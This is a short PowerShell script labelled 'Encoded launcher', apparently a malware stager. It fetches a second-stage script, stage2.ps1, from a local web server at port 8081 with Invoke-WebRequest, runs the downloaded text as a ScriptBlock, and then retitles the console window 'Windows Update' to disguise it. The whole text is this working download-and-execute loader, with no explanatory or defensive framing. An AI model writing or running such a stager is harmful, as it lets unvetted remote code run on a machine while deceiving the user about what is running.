# Encoded launcher
$TargetUrl = 'http://localhost:8081/stage2.ps1'
$PayloadText = (iwr $TargetUrl -UseBasicParsing).Content
[ScriptBlock]::Create($PayloadText).Invoke()
$Host.UI.RawUI.WindowTitle = "Windows Update"
